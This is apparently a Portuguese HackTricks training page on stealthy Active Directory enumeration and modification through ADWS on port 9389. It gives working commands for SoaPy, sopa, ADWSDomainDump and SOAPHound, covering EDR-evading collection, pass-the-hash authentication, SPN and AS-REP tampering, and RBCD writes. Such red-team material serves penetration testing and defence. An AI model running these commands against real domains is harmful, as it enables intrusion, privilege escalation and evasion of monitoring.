# Enumeração e Coleta Stealth do Active Directory Web Services (ADWS)

{{#include ../../banners/hacktricks-training.md}}

## O que é o ADWS?

O Active Directory Web Services (ADWS) é **habilitado por padrão em todo Domain Controller desde o Windows Server 2008 R2** e escuta na porta TCP **9389**. Apesar do nome, **nenhum HTTP está envolvido**. Em vez disso, o serviço expõe dados no estilo LDAP por meio de uma stack de protocolos proprietários de framing .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Como o tráfego é encapsulado dentro desses frames SOAP binários e passa por uma porta incomum, a **enumeração por meio do ADWS tem muito menos probabilidade de ser inspecionada, filtrada ou identificada por assinaturas do que o tráfego LDAP/389 e 636 clássico**. Para operadores, isso significa:<sup>[[1]](#references)[[7]](#references)</sup>

* Recon mais furtivo – as Blue teams geralmente se concentram em queries LDAP.
* Liberdade para coletar dados de **hosts não Windows (Linux, macOS)** fazendo tunnelling de 9389/TCP por meio de um proxy SOCKS.
* Os mesmos dados que você obteria via LDAP (usuários, grupos, ACLs, schema etc.) e a capacidade de realizar **writes** (por exemplo, `msDs-AllowedToActOnBehalfOfOtherIdentity` para **RBCD**).

As interações com o ADWS são implementadas sobre WS-Enumeration: cada query começa com uma mensagem `Enumerate` que define o filtro/atributos LDAP e retorna um GUID `EnumerationContext`, seguida por uma ou mais mensagens `Pull` que transmitem resultados até o limite de resultados definido pelo servidor.<sup>[[7]](#references)</sup> Os contextos expiram após cerca de 30 minutos, portanto as ferramentas precisam paginar os resultados ou dividir os filtros (queries por prefixo de CN) para evitar a perda do estado.<sup>[[8]](#references)</sup> Ao solicitar security descriptors, especifique o controle `LDAP_SERVER_SD_FLAGS_OID` para omitir SACLs; caso contrário, o ADWS simplesmente remove o atributo `nTSecurityDescriptor` de sua resposta SOAP.

> NOTE: O ADWS também é usado por muitas ferramentas RSAT GUI/PowerShell, portanto o tráfego pode se misturar com atividade legítima de administração.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) é uma **reimplementação completa da stack de protocolos do ADWS em Python puro**. Ele cria os frames NBFX/NBFSE/NNS/NMF byte a byte, permitindo a coleta a partir de sistemas Unix-like sem tocar no runtime .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Principais recursos

* Suporte a **proxying por SOCKS** (útil a partir de C2 implants).
* Search filters refinados, idênticos ao LDAP `-q '(objectClass=user)'`.
* Operações opcionais de **write** (`--set` / `--delete`).
* **BOFHound output mode** para ingestão direta no BloodHound.
* A flag `--parse` para formatar timestamps / `userAccountControl` quando a legibilidade humana for necessária.<sup>[[2]](#references)</sup>

### Flags de coleta direcionada e operações de write

O SoaPy inclui switches selecionados que replicam as tarefas mais comuns de LDAP hunting sobre ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, além das opções `--query` / `--filter` raw para pulls personalizados. Combine-as com primitives de write, como `--rbcd <source>` (define `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging para Kerberoasting direcionado) e `--asrep` (altera `DONT_REQ_PREAUTH` em `userAccountControl`).<sup>[[2]](#references)</sup>

Exemplo de SPN hunt direcionado que retorna apenas `samAccountName` e `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Use o mesmo host/credenciais para weaponizar imediatamente os achados: liste os objetos capazes de RBCD com `--rbcds` e, em seguida, aplique `--rbcd 'WEBSRV01$' --account 'FILE01$'` para preparar uma cadeia de Resource-Based Constrained Delegation (consulte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) para o caminho completo de abuso).

### Instalação (host do operador)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump sobre ADWS (Linux/Windows)

* Fork de `ldapdomaindump` que troca consultas LDAP por chamadas ADWS na porta TCP/9389 para reduzir detecções de assinaturas LDAP.
* Executa uma verificação inicial de acessibilidade à porta 9389, a menos que `--force` seja informado (ignora a sondagem se os port scans forem ruidosos/filtrados).
* Testado com Microsoft Defender for Endpoint e CrowdStrike Falcon, com bypass bem-sucedido no README.<sup>[[4]](#references)</sup>

### Instalação
```bash
pipx install .
```
### Uso
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
A saída típica registra a verificação de reachability da porta 9389, o bind do ADWS e o início/fim do dump:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Um cliente prático para ADWS em Golang

Assim como o soapy, o [sopa](https://github.com/Macmod/sopa) implementa a pilha de protocolos ADWS (MS-NNS + MC-NMF + SOAP) em Golang, expondo flags de linha de comando para emitir chamadas ADWS, como:<sup>[[5]](#references)</sup>

* **Pesquisa e recuperação de objetos** - `query` / `get`
* **Ciclo de vida dos objetos** - `create [user|computer|group|ou|container|custom]` e `delete`
* **Edição de atributos** - `attr [add|replace|delete]`
* **Gerenciamento de contas** - `set-password` / `change-password`
* e outros, como `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

### Destaques do mapeamento de protocolos

* Pesquisas no estilo LDAP são emitidas via **WS-Enumeration** (`Enumerate` + `Pull`), com projeção de atributos, controle de escopo (Base/OneLevel/Subtree) e paginação.
* A busca de um único objeto usa **WS-Transfer** `Get`; alterações de atributos usam `Put`; exclusões usam `Delete`.
* A criação de objetos integrada usa **WS-Transfer ResourceFactory**; objetos personalizados usam uma **IMDA AddRequest** orientada por templates YAML.
* As operações de senha são ações **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Descoberta de metadados não autenticada (mex)

O ADWS expõe o WS-MetadataExchange sem credenciais, o que é uma forma rápida de validar a exposição antes da autenticação:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Notas sobre descoberta de DNS/DC e targeting de Kerberos

Sopa pode resolver DCs via SRV se `--dc` for omitido e `--domain` for fornecido. Ele consulta nesta ordem e usa o target de maior prioridade:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
Operacionalmente, prefira um resolver controlado pelo DC para evitar falhas em ambientes segmentados:

* Use `--dns <DC-IP>` para que **todas** as consultas SRV/PTR/forward passem pelo DNS do DC.
* Use `--dns-tcp` quando o UDP estiver bloqueado ou as respostas SRV forem grandes.
* Se o Kerberos estiver habilitado e `--dc` for um IP, o sopa executará um **reverse PTR** para obter um FQDN para o direcionamento correto do SPN/KDC. Se o Kerberos não for usado, nenhuma consulta PTR será realizada.

Exemplo (IP + Kerberos, DNS forçado pelo DC):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Opções de material de autenticação

Além de senhas em texto simples, sopa aceita **NT hashes**, **chaves AES do Kerberos**, **ccache** e **certificados PKINIT** (PFX ou PEM) para autenticação ADWS. O Kerberos é implícito ao usar `--aes-key`, `-c` (ccache) ou opções baseadas em certificados.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Criação de objetos personalizados via templates

Para classes de objetos arbitrárias, o comando `create custom` consome um template YAML que mapeia para um `AddRequest` do IMDA:<sup>[[5]](#references)</sup>

* `parentDN` e `rdn` definem o container e o DN relativo.
* `attributes[].name` aceita `cn` ou `addata:cn` com namespace.
* `attributes[].type` aceita `string|int|bool|base64|hex` ou `xsd:*` explícito.
* **Não** inclua `ad:relativeDistinguishedName` ou `ad:container-hierarchy-parent`; o sopa os injeta.
* Os valores `hex` são convertidos para `xsd:base64Binary`; use `value: ""` para definir strings vazias.

## SOAPHound – Coleta ADWS em grande volume (Windows)

O [FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) é um collector .NET que mantém todas as interações LDAP dentro do ADWS e emite JSON compatível com o BloodHound v4. Ele cria um cache completo de `objectSid`, `objectGUID`, `distinguishedName` e `objectClass` uma vez (`--buildcache`) e, em seguida, reutiliza-o para passagens de alto volume `--bhdump`, `--certdump` (ADCS) ou `--dnsdump` (DNS integrado ao AD), de modo que apenas ~35 atributos críticos deixem o DC. O AutoSplit (`--autosplit --threshold <N>`) fragmenta automaticamente as queries por prefixo de CN para permanecer abaixo do timeout de 30 minutos do EnumerationContext em forests grandes.<sup>[[8]](#references)</sup>

Fluxo de trabalho típico em uma VM do operador ingressada no domínio:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exporta slots JSON diretamente para workflows do SharpHound/BloodHound — consulte [BloodHound methodology](bloodhound.md) para obter ideias de graphing posteriores. O AutoSplit torna o SOAPHound resiliente em florestas com milhões de objetos, mantendo a quantidade de queries menor que a de snapshots no estilo do ADExplorer.

## Workflow de Coleta Stealth de AD

O workflow a seguir mostra como enumerar **objetos de domínio e ADCS** via ADWS, convertê-los em JSON do BloodHound e procurar attack paths baseados em certificados — tudo a partir do Linux:

1. **Crie um túnel para 9389/TCP** da rede-alvo até sua máquina (por exemplo, via Chisel, Meterpreter, SSH dynamic port-forward etc.).  Exporte `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou use `--proxyHost/--proxyPort` do SoaPy.

2. **Colete o objeto do domínio raiz:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Colete objetos relacionados ao ADCS do Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Converter para BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Faça o upload do ZIP** na GUI do BloodHound e execute cypher queries como `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` para revelar caminhos de escalada de certificados (ESC1, ESC8, etc.).

### Gravando `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combine isso com `s4u2proxy`/`Rubeus /getticket` para uma cadeia completa de **Resource-Based Constrained Delegation** (consulte [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Resumo das ferramentas

| Finalidade | Ferramenta | Observações |
|---------|------|-------|
| Enumeração de ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, leitura/escrita |
| Dump de ADWS em grande volume | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, modos BH/ADCS/DNS |
| Ingestão no BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Converte logs do SoaPy/ldapsearch |
| Comprometimento de certificados | [Certipy](https://github.com/ly4k/Certipy) | Pode ser proxied pelo mesmo SOCKS |
| Enumeração de ADWS e alterações de objetos | [sopa](https://github.com/Macmod/sopa) | Cliente genérico para interagir com endpoints ADWS conhecidos - permite enumeração, criação de objetos, modificações de atributos e alterações de senha |

## Referências

- [1] [SpecterOps – Não deixe de usar SOAP(y) – Um guia do operador para coleta furtiva de AD usando ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy no GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound no GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump no GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa no GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – especificações MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Enumeração furtiva de ambientes do Active Directory por meio do ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – ferramenta SOAPHound para coletar dados do Active Directory por meio do ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
